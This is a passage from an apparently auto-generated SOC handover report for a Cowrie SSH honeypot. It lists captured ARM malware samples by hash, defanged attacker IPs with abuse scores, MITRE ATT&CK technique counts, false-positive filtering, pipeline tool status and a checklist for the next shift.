| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `47.251.43[.]29` | US | Alibaba Cloud - US | **100** ⚠️ | 5 |
| `102.210.149[.]130` | KE | New IP First Block2 | **100** ⚠️ | 11 |
| `186.117.251[.]40` | CO | CALS.3428382 | **100** ⚠️ | 14 |
| `20.193.130[.]202` | IN | Microsoft Corporation | **100** ⚠️ | 8 |
| `3.131.220[.]121` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `171.25.158[.]47` | SE | Vaxjo NET C2IP | **100** ⚠️ | 46 |
| `76.79.213[.]69` | US | Charter Communications Inc | **100** ⚠️ | 50 |
| `152.32.131[.]112` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 32 |
| `152.32.172[.]177` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 9 |
| `181.103.2[.]67` | PY | Núcleo S.A. | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 230 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 89 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 83 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 43 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 43 |

---

## 🔕 False Positive Summary (26 filtered)

| Reason | Count |
|---|---|
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 26 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 239 cases |
| Tool 34  | Credential Extractor        | ✅ 173 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 29 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 26 filtered (10.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 83 priority case(s) shown individually · 27 recon entry/entries in table (8 group(s) consolidating 111 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-16T06:05:19Z_
